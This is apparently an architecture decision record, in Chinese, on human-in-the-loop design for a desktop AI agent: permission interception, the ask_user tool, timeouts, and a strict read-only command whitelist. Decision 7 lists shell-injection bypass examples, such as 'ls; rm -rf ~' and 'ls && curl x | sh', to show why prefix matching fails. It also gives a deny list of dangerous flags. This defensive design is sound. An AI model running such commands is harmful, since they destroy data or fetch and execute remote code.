# ADR-0004 人机交互采用混合方案（方案 C）

日期：2026-09-30
状态：已接受（落地中——权限半边已实现，澄清半边规划在 v2.2）

本文记录人机交互的总体选型（方案 C）+ 6 个边界点的决策。前 5 个边界对应业界共识里容易踩模糊的细节，第 6 个是 ask_user 多轮串行约定。每个边界都附业界先例与选择理由，避免后续讨论时反复拍脑袋。

## 决策 0：总体采用方案 C（混合方案）

**背景**：人机交互在 agent 系统里有三种典型模式：

| 模式 | 代表 | 思想 |
|---|---|---|
| 一：Human-in-the-loop as Tool Call | LangGraph、AutoGen、Claude Computer Use、OpenAI Swarm | 把"人"当成一个 tool，agent 自主决定何时调用 |
| 二：Permission / Guardrail Layer | OpenInterpreter、Cursor、Windsurf、Claude Code | 在执行层拦截危险操作，不让 agent 决定 |
| 三：Plan-then-Execute | Devin、OpenAI Operator、Manus、Codex | agent 先出完整计划，人审批后再执行 |

v1 设计单走模式二（命令确认硬编码 `if c["name"] == "run_command"`），v2.2 规划的 ask_user 走模式一接口。把两种合并起来就是方案 C：

| 交互类型 | 处理方式 | 谁发起 |
|---|---|---|
| 权限确认（删文件/执行命令） | 系统拦截层，tool 执行前自动触发 | 系统 |
| 需求澄清（"你要处理哪个文件？"） | ask_user tool，agent 主动调用 | agent |
| 选择决策（"找到3个匹配文件，用哪个？"） | ask_user tool | agent |
| 错误恢复（执行失败，问用户怎么处理） | ask_user tool 或系统兜底（**见边界 5**） | 都行 |

**决策**：采用方案 C。这与业界共识对齐——"权限走系统层、提问走 agent 层；挂起用 interrupt/resume 而不是轮询/超时重试"。

**关键架构选择**：对外接口是模式一（agent 主动 tool call），**内部执行复用模式二的断点管道**。也就是说，ask_user 在 schema 形式上是个普通 tool，但执行路径与 confirm 完全一致——runner 拦截后存 `session.pending` + 结束本段 + 等 `resume_turn`。理由很务实：断点管道（pending / lock / 断流保半截 / 补 tool 占位）已经写好且测过，给 ask_user 单独搞一套挂起机制是浪费。

---

## 决策 1：危险工具的扩展机制 —— v3 改 schema 声明，v2 暂留硬编码

**问题**：v2 的 `if c["name"] == "run_command"` 硬编码拦截。v3 加 `move_file`（批量）后会有第二个危险工具，继续硬编码会让 runner 的 if 蔓延。

**业界做法**：

| 项目 | 做法 |
|---|---|
| OpenAI Assistants / Functions | 工具 schema 有 `confirmation_required` 字段 |
| Claude Computer Use | 工具按"危险等级"分类（safe / needs_confirmation / destructive），runner 看 level |
| Cursor / Windsurf | 工具 schema 有 `requiresApproval`，前端按 schema 渲染弹窗 |
| OpenInterpreter | 工具自带 `preview` 函数 |
| LangGraph | 工具 `interrupt_before` / `interrupt_after` 节点声明 |

**共识**：硬编码 if 是反模式——工具变多后 if 膨胀、工具作者还得改 runner、危险行为散落两处难测试。

**决策**：v3 落地 `move_file` 时同步改造——`tools/registry.py` 工具 schema 加 `requires_confirmation: bool`（默认 false），runner 改成 `if _registry.needs_confirm(c["name"])`。**v2 不动**——只有 `run_command` 一个危险工具，硬编码反而清晰，符合 plan §2.6 "不引入额外抽象" 原则。

详见 plan §3.2 ①b。

---

## 决策 2：CLI 不实现 ask_user 超时，只做 Web/SSE

**问题**：plan §2.6 任务 3 原写"CLI 侧:ask_user 终端交互 + 超时（同样惰性判定）"，但项目 memory 已明确"CLI 不实现超时，仅 WS"。两处打架。

**业界做法**：

| 项目 | CLI 行为 | Web/桌面行为 |
|---|---|---|
| OpenAI Assistants CLI | 无超时，等用户答 | Run 状态轮询/回调 |
| Cursor / Claude Code / Codex CLI | 阻塞 `input()`，永不超时 | UI 上有倒计时 |
| LangGraph CLI | 阻塞等 | checkpoint + 异步恢复 |

**共识**：CLI 是一问一答的同步模型，强加超时要开后台线程 + 信号打断 `input()`，复杂度不值。**业界没人做 CLI 超时**。

**决策**：CLI 不实现超时，等同 confirm 永不超时；超时只在 Web/SSE 路径有效（惰性判定 `expires_at`）。已同步修正 plan §2.6 任务 3 + 对齐 memory。

---

## 决策 3：并发工具调用时 ask_user / confirm 不参与并行，独占串行

**问题**：v4.3 计划用 `asyncio.gather` 并行执行互不依赖的 tool_calls。如果同一轮 agent 调了 `[ask_user, read_file]`，按现在 runner 是顺序执行（先 ask_user 就 yield return），但 v4.3 加 gather 后行为会变。

**业界做法**：

| 项目 | 做法 |
|---|---|
| LangGraph | `interrupt` 节点暂停整个 graph，其他并行分支也停（checkpoint 整图保存） |
| AutoGen | "Human in the loop" 工具自动序列化，不参与并行 |
| OpenAI Swarm | handoff / ask 工具显式标注 `is_async=False`，runner 跳过 gather |
| Claude Computer Use | 任何"需要人输入"的工具立刻 break 循环，其他 tool_calls 推到下一轮 |

**共识**：交互工具（ask_user / confirm）**永远先单独处理**，遇到就 break 并行批次，下一段单独跑这个工具，再下一段恢复并行。

**决策**：v4.3 改造时执行批次前先扫一遍 calls——`interactive_calls`（ask_user / 需确认）串行 + `compute_calls`（纯计算）并行。理由：一个会话同时只能挂一个 pending（§2.5），并行两个 ask_user 会让第二个 call_index 错位、pending 互相覆盖。

详见 plan §4.3。

---

## 决策 4：超时后续跑路径 —— 选 A 自动续跑（业界更主流）

**问题**：超时是惰性判定（`resume_turn` 进来时 `now > expires_at` → 按 timeout 处理）。但**前端不弹框后，谁触发 resume**？没人触发的话 pending 一直挂着，agent 不会续跑。

**业界做法**：

| 做法 | 代表项目 | 行为 |
|---|---|---|
| A. 自动续跑 timeout | OpenAI Assistants（Run 到 `expired` 状态自动结束）、LangGraph（checkpointer 超时自动 commit timeout） | 用户回来时系统已自动把 timeout 结果喂回 LLM，agent 已继续跑或已中止；用户看到的是"已结束" |
| B. 等用户发新消息 | Claude Code、Cursor、Codex CLI | 超时后 pending 标记过期但不动 agent；用户回来必须发新消息，agent 才会先把 timeout 结果落历史再起新回合 |

**共识倾向 A**：B 要求用户明白"我得发条消息激活"，认知负担重；A 让 agent 在 timeout 后自己往下走（用默认值或中止），用户回来看到的是结果而不是卡住。

**决策**：选 A。前端在 `GET /api/sessions/{id}` 检测到 `pending` 已过期时，**自动发一次 `POST /api/chat/resume`（status=timeout）**让 agent 续跑。落地时序：超时判定 + resume API 已就位（v2.2），自动续跑的触发方在前端（v3.2）。v2 阶段（无前端）接受"超时后僵住"的边界，靠 curl 手动 resume 验证。

详见 plan §2.6 "超时后续跑路径"。

---

## 决策 5：错误恢复路径 —— 工具失败喂回 LLM 自纠，不在系统层主动调 ask_user

**问题**：plan §2.2 原列 ask_user 用途只写"需求歧义 / 多方案决策 / 缺少关键信息"，没列"工具失败后问用户"。runner.py 注释说"业务失败喂回模型让它自纠（文件不存在等）"，但没说自纠失败几次后该走 ask_user。

**业界做法**：

| 场景 | 业界做法 |
|---|---|
| 业务错误（文件不存在、命令失败、参数错） | 工具结果喂回 LLM 自纠，**不主动问用户**。OpenAI Function Calling、LangGraph 都默认这套 |
| 不可恢复错误（缺权限、文件被锁、网络断） | 工具结果带错误码喂回 LLM，LLM 自己决定是否调 ask_user。Claude Code / Cursor 都是 LLM 决策 |
| 多次失败后 | 系统兜底——连续 N 次同工具失败 → 强制中断 → yield error，**不自动问用户**。OpenInterpreter 走这条 |
| 关键决策歧义（不是错误） | LLM 主动调 ask_user（agent 决策，不是系统） |

**共识**：**错误恢复 → 喂回 LLM 自纠，不要在系统层主动调 ask_user**。问不问是 LLM 的决策，不是 runner 的——这是 agent 自主性的核心，runner 兜底等于越权。

**决策**：plan §2.2 ask_user 用途列表里加一条"工具失败后求助用户（agent 决定要不要问）"，同时系统 prompt 引导"连续 2 次同工具失败后再考虑 ask_user 问用户怎么处理"。**不在 runner 层加自动 ask_user 兜底**——违反"agent 自主决策"原则，是过度设计。

---

## 决策 6：多 ask_user 串行 —— 一段一问，多回合 ReAct

**问题**：plan §2.2 说"系统 prompt 限制最多问 2-3 个问题"，但没说怎么实现。是 LLM 一次返回多个 ask_user calls 让前端批量弹，还是分多回合问？

**业界做法分两派**：

| 派别 | 代表项目 | 做法 |
|---|---|---|
| A. 一段一个问，分多回合 | LangGraph、OpenAI Assistants、Claude Code | 一次只问一个，答完 LLM 再决定下一个问什么；多问 = 多回合 ReAct |
| B. 一次批量问多个 | AutoGen（部分场景）、表单类对话 UI | LLM 一次返回多个 ask_user calls，前端一次弹一组表单 |

**主流共识是 A**：A 让 LLM 看到 P1 的答案后再决定 P2 怎么问（甚至是否还需要问）——**避免无效追问**。问"用账号密码还是手机号"，答"手机号"，下个问题自然变成"11 位手机号还是带验证码"，而不是按预想必问"密码几位"。B 表单式适合"结构化数据采集"（如订机票要姓名+身份证+日期），但 agent 任务流不是这种形态。

**决策**：选 A。一段一问，答完 agent 再决定下一个问不问。**当前 runner 实现天然就是 A**（一个 ask_user 就 yield return 结束本段），所以这个决策**不改逻辑，只写文档约定**——避免后续有人误以为要支持"一次问多个"。

memory 里"系统 prompt 限制最多问 2-3 个"配合 A：agent 不会无限追问，3 次就强制降级用默认值。这是业界 Claude Code / Cursor 的常见 prompt 约束。

详见 plan §2.2 "多 ask_user 串行约定"。

---

## 决策 7：命令粒度的只读分级 —— 结构化只读工具 ＋ 严格命令白名单，双管齐下

**问题**：v2.1 落地后实测发现 agent 为了解项目会跑 `ls`、`git status`，而 `run_command` 一刀切全部确认（memory 原硬约束"命令执行需全部确认，无白名单"），看个目录也要点 y/n，繁琐。决策 1 覆盖的是**工具粒度**（run_command 与 move_file 谁要确认），但没覆盖**命令粒度**（同一个 run_command 里 `ls` 只读 vs `rm` 危险）——这是计划外的新决策点。

**业界复查结论（修正本 ADR 早先"业界不做白名单"的说法）**：业界不是"结构化工具 vs 白名单"二选一，而是**两者结合**——

| 项目 | 机制 |
|---|---|
| Claude Code | 专用 Read/Glob/Grep 工具 ＋ bash 只读前缀自动批准（复合命令不批）＋ macOS Seatbelt 沙箱兜底 |
| Cursor / Windsurf | 终端命令 auto-run 白名单（可配置）＋ yolo 模式 |
| Gemini CLI / OpenInterpreter | 只读命令前缀白名单 |
| Codex CLI | 沙箱 ＋ 审批策略（只读自动、写工作区自动、网络要批） |

结构化工具承载高频只读（参数结构化、天然安全），shell 白名单兜底 `git status` / `git log` 这类没有专用工具的常用只读命令；沙箱是最后防线（本项目 v2 不做）。

**裸前缀匹配为什么危险，以及怎么防**：`run_command` 用 `shell=True`，`startswith("ls")` 这类裸前缀匹配必然被绕过——

```bash
ls; rm -rf ~        # 命令连接
ls && curl x | sh  # 管道
ls $(reboot)       # 命令替换
ls > /etc/passwd   # 重定向
find . -delete     # 白名单程序 + 危险参数
```

**决策：两层都做，但白名单走严格判定，不用 startswith**：

1. **结构化只读工具**：`list_dir(path)` 独立工具免确认（`pathlib`，无 shell 注入面），引导模型看目录首选它。后续 `grep`/`glob` 按需照此新增。
2. **严格命令白名单**：`command.py` 的 `is_auto_approved(cmd)`，只放行"单条简单只读命令"：
   - 含任何 shell 元字符（`; | & > < \` $() 换行`，引号内出现也拒）→ 不批（`ls | grep` 这种安全复合被误伤，方向安全可接受）
   - `shlex.split` 严格分词，程序名**精确匹配**只读集合（ls/cat/grep/find/… 约 20 个）
   - `git` 单独处理：第二 token 必须在只读子命令集合（status/log/diff/show/blame/ls-files）
   - `find` 禁 `-exec/-ok/-delete/-fprint` 等能执行/写盘的参数
   - 引号未闭合、`sudo`、`sed/awk`（可执行命令）、`env`（可能泄密钥）、拿不准的 → 一律不批
3. **定位是"减少打扰"，不是安全边界**：原则是"漏判不可接受、误伤可接受"；真正的安全边界未来靠沙箱（对齐 Codex CLI / Claude Code）。集合写死在代码里，v3 前端做配置化。

**实现**：runner 拦截条件改为 `name == "run_command" and not is_auto_approved(cmd)`，白名单命令直接走 `_execute`；`list_dir` 等结构化工具则天然不经过该分支。31 条攻防用例（含全部上述绕过变体）验证全部拦住。

详见 plan §2.2 文件工具 `list_dir` 与命令执行节。

---

## 附：7 个边界一表对照

| # | 边界 | 业界主流做法 | 本项目决策 | 落地切片 |
|---|---|---|---|---|
| 1 | 危险工具扩展 | schema 声明 `requires_confirmation` | v2 留硬编码，v3 改 schema | v3.1 |
| 2 | CLI 超时 | CLI 不实现超时 | CLI 不实现，只 Web/SSE | v2.2 |
| 3 | 并发与 ask_user | 交互工具独占串行 | 不参与 gather，单独 yield return | v4.3 |
| 4 | 超时后续跑 | A 自动续跑（业界更主流） | 选 A，前端拉到过期 pending 自动 POST resume | v2.2（API）+ v3.2（前端） |
| 5 | 错误恢复 | 工具结果喂回 LLM，agent 自己决定是否 ask_user | 不在 runner 兜底，靠 prompt 引导 | v2.2（prompt） |
| 6 | 多 ask_user | 一段一问，多回合 ReAct | 选 A（当前 runner 已天然如此） | v2.2（文档约定） |
| 7 | 只读操作免确认 | 结构化只读工具 ＋ bash 只读白名单 ＋ 沙箱 | `list_dir` 结构化工具 ＋ `is_auto_approved` 严格白名单（shlex 分词/拒元字符，非 startswith）；沙箱不做 | v2.1 增补（已落地） |

## 不在范围（划线）

- 多用户权限——桌面助手单用户，与本项目无关
- 表单式批量提问——属于结构化数据采集场景，agent 任务流不是这种形态
- 计划审批流（模式三 Plan-then-Execute）——本项目 agent 是 ReAct 循环，不出完整计划等人审批；v3.1 的 plan 事件只是过程展示，不是审批门
